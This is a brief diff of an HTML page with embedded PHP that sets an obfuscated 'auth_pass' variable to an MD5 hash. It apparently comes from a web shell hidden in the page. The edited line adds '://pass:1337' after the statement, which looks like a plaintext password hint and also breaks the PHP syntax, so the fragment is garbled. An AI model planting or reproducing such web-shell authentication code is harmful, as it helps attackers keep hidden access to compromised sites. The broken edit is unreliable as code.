@@ -6,7 +6,7 @@
 <body>
 <?php
 
-$wvvmby = "auth_pass";
+$wvvmby = "auth_pass";  ://pass:1337
 $ {
     $wvvmby
 } = "e48e13207341b6bffb7fb1622282247b";
